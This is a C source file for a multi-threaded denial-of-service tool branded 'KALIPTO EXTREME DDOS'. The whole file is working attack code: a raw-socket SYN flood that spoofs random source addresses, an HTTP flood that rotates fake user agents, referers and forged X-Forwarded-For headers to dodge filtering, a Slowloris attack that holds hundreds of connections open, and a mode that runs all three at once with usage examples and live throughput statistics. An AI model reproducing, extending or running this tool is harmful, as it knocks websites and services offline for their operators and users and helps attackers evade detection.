// extreme_ddos_l7.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>
#include <errno.h>

// ================ CONFIGURATION ================
#define MAX_THREADS 1000
#define MAX_CONNECTIONS_PER_THREAD 100
#define USER_AGENTS_COUNT 20
#define REFERERS_COUNT 10

// ================ USER AGENTS ================
const char *user_agents[] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 OPR/104.0.0.0",
    "Mozilla/5.0 (Android 13; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
};

// ================ REFERERS ================
const char *referers[] = {
    "https://www.google.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.duckduckgo.com/",
    "https://www.linkedin.com/",
    "https://www.reddit.com/",
    "https://www.instagram.com/",
    "https://www.youtube.com/"
};

// ================ ATTACK TYPES ================
typedef enum {
    ATTACK_SYN,      // Layer 4 SYN Flood
    ATTACK_HTTP,     // Layer 7 HTTP Flood
    ATTACK_HTTPS,    // Layer 7 HTTPS Flood
    ATTACK_SLOWLORIS // Layer 7 Slowloris
} attack_type_t;

// ================ THREAD DATA ================
struct thread_data {
    char target[256];
    int target_port;
    int duration;
    int thread_id;
    attack_type_t attack_type;
    int use_ssl;
};

// ================ STATISTICS ================
typedef struct {
    unsigned long long total_packets;
    unsigned long long total_bytes;
    unsigned long long total_requests;
    time_t start_time;
} stats_t;

stats_t global_stats = {0, 0, 0, 0};
pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;

// ================ UTILITY FUNCTIONS ================

void update_stats(int packets, int bytes, int requests) {
    pthread_mutex_lock(&stats_mutex);
    global_stats.total_packets += packets;
    global_stats.total_bytes += bytes;
    global_stats.total_requests += requests;
    pthread_mutex_unlock(&stats_mutex);
}

const char* get_random_user_agent() {
    return user_agents[rand() % USER_AGENTS_COUNT];
}

const char* get_random_referer() {
    return referers[rand() % REFERERS_COUNT];
}

// ================ LAYER 4 SYN FLOOD ================

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void *syn_flood_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    char packet[4096];
    struct iphdr *ip = (struct iphdr *)packet;
    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct sockaddr_in dest;
    int packets_sent = 0;
    time_t end_time = time(NULL) + data->duration;

    // Create raw socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return NULL;
    }

    // Set socket options
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    dest.sin_family = AF_INET;
    dest.sin_port = htons(data->target_port);
    dest.sin_addr.s_addr = inet_addr(data->target);

    while (time(NULL) < end_time) {
        // Fill IP header
        ip->ihl = 5;
        ip->version = 4;
        ip->tos = 0;
        ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        ip->id = htons(rand() % 65535);
        ip->frag_off = 0;
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->check = 0;
        ip->saddr = rand(); // Random source IP
        ip->daddr = dest.sin_addr.s_addr;

        // Fill TCP header
        tcp->source = htons(rand() % 65535);
        tcp->dest = htons(data->target_port);
        tcp->seq = htonl(rand() % 4294967295);
        tcp->ack_seq = 0;
        tcp->doff = 5;
        tcp->syn = 1;
        tcp->window = htons(5840);
        tcp->check = 0;
        tcp->urg_ptr = 0;

        // IP checksum
        ip->check = checksum((unsigned short *)packet, sizeof(struct iphdr));

        // Send packet
        sendto(sock, packet, ip->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest));
        
        packets_sent++;
        
        if (packets_sent % 10000 == 0) {
            update_stats(10000, 10000 * ip->tot_len, 0);
            if (data->thread_id == 0) {
                printf("[SYN] Thread %d: %d packets sent\n", data->thread_id, packets_sent);
            }
        }
    }

    close(sock);
    update_stats(packets_sent % 10000, (packets_sent % 10000) * sizeof(struct iphdr) + sizeof(struct tcphdr), 0);
    return NULL;
}

// ================ LAYER 7 HTTP FLOOD ================

void *http_flood_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    struct hostent *host;
    char request[4096];
    char path[256];
    char hostname[256];
    int requests_sent = 0;
    int bytes_sent = 0;
    time_t end_time = time(NULL) + data->duration;
    
    // Extract hostname from URL
    char url_copy[256];
    strcpy(url_copy, data->target);
    
    char *protocol = strstr(url_copy, "://");
    if (protocol) {
        strcpy(hostname, protocol + 3);
    } else {
        strcpy(hostname, url_copy);
    }
    
    // Remove path
    char *slash = strchr(hostname, '/');
    if (slash) {
        *slash = '\0';
    }
    
    // Resolve hostname
    host = gethostbyname(hostname);
    if (host == NULL) {
        fprintf(stderr, "Thread %d: Cannot resolve hostname %s\n", data->thread_id, hostname);
        return NULL;
    }
    
    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->target_port);
    memcpy(&server_addr.sin_addr, host->h_addr, host->h_length);
    
    while (time(NULL) < end_time) {
        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            continue;
        }
        
        // Set socket timeout
        struct timeval tv;
        tv.tv_sec = 2;
        tv.tv_usec = 0;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        
        // Connect
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            // Generate random path
            sprintf(path, "/%d?%d=%d&_=%ld", 
                    rand() % 10000, 
                    rand() % 1000, 
                    rand() % 1000,
                    time(NULL) * 1000 + rand() % 1000);
            
            // Build HTTP request
            sprintf(request,
                "GET %s HTTP/1.1\r\n"
                "Host: %s\r\n"
                "User-Agent: %s\r\n"
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                "Accept-Language: en-US,en;q=0.5\r\n"
                "Accept-Encoding: gzip, deflate\r\n"
                "Connection: keep-alive\r\n"
                "Referer: %s\r\n"
                "X-Forwarded-For: %d.%d.%d.%d\r\n"
                "Cache-Control: no-cache\r\n"
                "Pragma: no-cache\r\n"
                "\r\n",
                path,
                hostname,
                get_random_user_agent(),
                get_random_referer(),
                rand() % 256, rand() % 256, rand() % 256, rand() % 256
            );
            
            // Send request
            int len = strlen(request);
            if (send(sock, request, len, 0) > 0) {
                requests_sent++;
                bytes_sent += len;
                
                // Try to receive response (optional)
                char buffer[4096];
                recv(sock, buffer, sizeof(buffer), 0);
            }
        }
        
        close(sock);
        
        // Update stats periodically
        if (requests_sent % 100 == 0) {
            update_stats(0, bytes_sent, requests_sent);
            if (data->thread_id == 0) {
                printf("[HTTP] Thread %d: %d requests sent\n", data->thread_id, requests_sent);
            }
            bytes_sent = 0;
            requests_sent = 0;
        }
    }
    
    update_stats(0, bytes_sent, requests_sent);
    return NULL;
}

// ================ LAYER 7 SLOWLORIS ================

void *slowloris_thread(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sockets[500];
    struct sockaddr_in server_addr;
    struct hostent *host;
    char hostname[256];
    time_t end_time = time(NULL) + data->duration;
    int active_sockets = 0;
    
    // Extract hostname
    char url_copy[256];
    strcpy(url_copy, data->target);
    
    char *protocol = strstr(url_copy, "://");
    if (protocol) {
        strcpy(hostname, protocol + 3);
    } else {
        strcpy(hostname, url_copy);
    }
    
    char *slash = strchr(hostname, '/');
    if (slash) {
        *slash = '\0';
    }
    
    // Resolve hostname
    host = gethostbyname(hostname);
    if (host == NULL) {
        return NULL;
    }
    
    // Setup server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->target_port);
    memcpy(&server_addr.sin_addr, host->h_addr, host->h_length);
    
    // Create initial connections
    for (int i = 0; i < 500; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv;
        tv.tv_sec = 2;
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            char request[256];
            sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n", 
                    hostname, get_random_user_agent());
            send(sock, request, strlen(request), 0);
            sockets[active_sockets++] = sock;
        } else {
            close(sock);
        }
    }
    
    // Keep connections alive
    while (time(NULL) < end_time && active_sockets > 0) {
        for (int i = 0; i < active_sockets; i++) {
            char header[64];
            sprintf(header, "X-%d: %d\r\n", rand() % 10000, rand() % 10000);
            if (send(sockets[i], header, strlen(header), 0) <= 0) {
                close(sockets[i]);
                // Replace with new connection
                int new_sock = socket(AF_INET, SOCK_STREAM, 0);
                if (new_sock >= 0) {
                    if (connect(new_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
                        char request[256];
                        sprintf(request, "GET / HTTP/1.1\r\nHost: %s\r\n", hostname);
                        send(new_sock, request, strlen(request), 0);
                        sockets[i] = new_sock;
                        update_stats(0, strlen(request), 1);
                    } else {
                        close(new_sock);
                        sockets[i] = sockets[--active_sockets];
                        i--;
                    }
                }
            } else {
                update_stats(0, strlen(header), 0);
            }
        }
        
        if (data->thread_id == 0) {
            printf("[SLOWLORIS] Active connections: %d\n", active_sockets);
        }
        
        sleep(10);
    }
    
    // Close all sockets
    for (int i = 0; i < active_sockets; i++) {
        close(sockets[i]);
    }
    
    return NULL;
}

// ================ MAIN FUNCTION ================

void print_usage() {
    printf("Usage: extreme_ddos <target> <port> <duration> <type> [threads]\n");
    printf("Types:\n");
    printf("  syn      - Layer 4 SYN Flood\n");
    printf("  http     - Layer 7 HTTP Flood\n");
    printf("  https    - Layer 7 HTTPS Flood (not implemented)\n");
    printf("  slow     - Layer 7 Slowloris\n");
    printf("  all      - All attacks combined\n");
    printf("\nExamples:\n");
    printf("  ./extreme_ddos 192.168.1.100 80 60 syn\n");
    printf("  ./extreme_ddos http://example.com 80 60 http\n");
    printf("  ./extreme_ddos example.com 80 300 slow\n");
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        print_usage();
        return 1;
    }
    
    // Seed random
    srand(time(NULL) ^ getpid());
    
    char *target = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    char *type_str = argv[4];
    
    int num_threads = MAX_THREADS;
    if (argc >= 6) {
        num_threads = atoi(argv[5]);
        if (num_threads > MAX_THREADS) {
            num_threads = MAX_THREADS;
        }
    }
    
    attack_type_t attack_type;
    int use_ssl = 0;
    
    if (strcmp(type_str, "syn") == 0) {
        attack_type = ATTACK_SYN;
    } else if (strcmp(type_str, "http") == 0) {
        attack_type = ATTACK_HTTP;
    } else if (strcmp(type_str, "https") == 0) {
        attack_type = ATTACK_HTTPS;
        use_ssl = 1;
    } else if (strcmp(type_str, "slow") == 0) {
        attack_type = ATTACK_SLOWLORIS;
    } else if (strcmp(type_str, "all") == 0) {
        // Will create multiple threads with different attack types
        attack_type = ATTACK_SYN; // Placeholder
    } else {
        printf("Unknown attack type: %s\n", type_str);
        print_usage();
        return 1;
    }
    
    global_stats.start_time = time(NULL);
    
    printf("\n=== KALIPTO EXTREME DDOS ===\n");
    printf("Target: %s\n", target);
    printf("Port: %d\n", port);
    printf("Duration: %d seconds\n", duration);
    printf("Attack Type: %s\n", type_str);
    printf("Threads: %d\n", num_threads);
    printf("============================\n\n");
    
    pthread_t threads[num_threads];
    struct thread_data data[num_threads];
    
    if (strcmp(type_str, "all") == 0) {
        // Distribute threads among attack types
        int syn_threads = num_threads / 3;
        int http_threads = num_threads / 3;
        int slow_threads = num_threads - syn_threads - http_threads;
        
        printf("Distribution: SYN=%d, HTTP=%d, Slowloris=%d\n", 
               syn_threads, http_threads, slow_threads);
        
        int thread_idx = 0;
        
        // SYN threads
        for (int i = 0; i < syn_threads; i++) {
            strcpy(data[thread_idx].target, target);
            data[thread_idx].target_port = port;
            data[thread_idx].duration = duration;
            data[thread_idx].thread_id = thread_idx;
            data[thread_idx].attack_type = ATTACK_SYN;
            pthread_create(&threads[thread_idx], NULL, syn_flood_thread, &data[thread_idx]);
            thread_idx++;
        }
        
        // HTTP threads
        for (int i = 0; i < http_threads; i++) {
            strcpy(data[thread_idx].target, target);
            data[thread_idx].target_port = port;
            data[thread_idx].duration = duration;
            data[thread_idx].thread_id = thread_idx;
            data[thread_idx].attack_type = ATTACK_HTTP;
            pthread_create(&threads[thread_idx], NULL, http_flood_thread, &data[thread_idx]);
            thread_idx++;
        }
        
        // Slowloris threads
        for (int i = 0; i < slow_threads; i++) {
            strcpy(data[thread_idx].target, target);
            data[thread_idx].target_port = port;
            data[thread_idx].duration = duration;
            data[thread_idx].thread_id = thread_idx;
            data[thread_idx].attack_type = ATTACK_SLOWLORIS;
            pthread_create(&threads[thread_idx], NULL, slowloris_thread, &data[thread_idx]);
            thread_idx++;
        }
    } else {
        // Single attack type
        void *(*thread_func)(void *);
        
        switch (attack_type) {
            case ATTACK_SYN:
                thread_func = syn_flood_thread;
                break;
            case ATTACK_HTTP:
            case ATTACK_HTTPS:
                thread_func = http_flood_thread;
                break;
            case ATTACK_SLOWLORIS:
                thread_func = slowloris_thread;
                break;
            default:
                thread_func = syn_flood_thread;
        }
        
        for (int i = 0; i < num_threads; i++) {
            strcpy(data[i].target, target);
            data[i].target_port = port;
            data[i].duration = duration;
            data[i].thread_id = i;
            data[i].attack_type = attack_type;
            data[i].use_ssl = use_ssl;
            
            if (pthread_create(&threads[i], NULL, thread_func, &data[i]) != 0) {
                perror("pthread_create");
                return 1;
            }
        }
    }
    
    printf("\n[+] Attack started! Press Ctrl+C to stop early\n");
    
    // Monitor thread
    time_t start_monitor = time(NULL);
    while (time(NULL) - start_monitor < duration) {
        sleep(5);
        int elapsed = time(NULL) - start_monitor;
        int remaining = duration - elapsed;
        
        pthread_mutex_lock(&stats_mutex);
        printf("\r[%d/%d sec] Packets: %llu | Bytes: %.2f MB | Requests: %llu", 
               elapsed, duration,
               global_stats.total_packets,
               global_stats.total_bytes / (1024.0 * 1024.0),
               global_stats.total_requests);
        fflush(stdout);
        pthread_mutex_unlock(&stats_mutex);
    }
    
    printf("\n\n[+] Waiting for threads to finish...\n");
    
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("\n=== FINAL STATISTICS ===\n");
    printf("Total Packets: %llu\n", global_stats.total_packets);
    printf("Total Bytes: %.2f MB\n", global_stats.total_bytes / (1024.0 * 1024.0));
    printf("Total Requests: %llu\n", global_stats.total_requests);
    printf("Average Speed: %.2f MB/s\n", 
           (global_stats.total_bytes / (1024.0 * 1024.0)) / duration);
    printf("========================\n");
    
    return 0;
}